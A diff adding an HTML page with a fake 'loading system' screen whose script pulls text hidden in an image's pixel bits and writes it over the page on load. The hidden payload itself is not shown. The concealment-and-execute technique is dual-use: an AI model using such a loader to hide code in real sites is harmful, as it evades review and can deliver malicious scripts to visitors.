@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading System...</title>
+    <style>
+        body { 
+            background: #0a0a0a; 
+            color: #22c55e; 
+            font-family: monospace; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh; 
+            margin: 0; 
+            overflow: hidden;
+        }
+        #status { letter-spacing: 2px; text-transform: uppercase; font-size: 0.8rem; }
+        #status::after { content: '_'; animation: blink 1s infinite; }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
+    </style>
+</head>
+<body>
+
+    <div id="status">initializing_defragmentation</div>
+    <canvas id="buffer" style="display:none;"></canvas>
+
+    <script>
+        (function() {
+            const status = document.getElementById('status');
+            // Altere aqui para o caminho da sua imagem no GitHub
+            const fragmentImg = 'assets/img/fragment.png'; 
+
+            const img = new Image();
+            img.crossOrigin = "Anonymous";
+            img.src = fragmentImg;
+
+            img.onload = function() {
+                status.innerText = "extracting_payload";
+                
+                const canvas = document.getElementById('buffer');
+                const ctx = canvas.getContext('2d');
+                canvas.width = img.width;
+                canvas.height = img.height;
+                ctx.drawImage(img, 0, 0);
+
+                const data = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
+                let bits = "";
+
+                // Extrai LSB dos canais R, G e B
+                for (let i = 0; i < data.length; i++) {
+                    if ((i + 1) % 4 === 0) continue; // Pula Alpha
+                    bits += (data[i] & 1);
+                }
+
+                // Converte bits para String
+                let payload = "";
+                for (let i = 0; i < bits.length; i += 8) {
+                    let byte = bits.slice(i, i + 8);
+                    if (byte.length < 8) break;
+                    let charCode = parseInt(byte, 2);
+                    if (charCode === 0) break; // Terminador nulo
+                    payload += String.fromCharCode(charCode);
+                }
+
+                if (payload.length > 0) {
+                    status.innerText = "executing";
+                    setTimeout(() => {
+                        document.open();
+                        document.write(payload);
+                        document.close();
+                    }, 500);
+                } else {
+                    status.innerText = "error_null_payload";
+                }
+            };
+
+            img.onerror = () => { status.innerText = "error_signal_lost"; };
+        })();
+    </script>
+</body>
+</html>
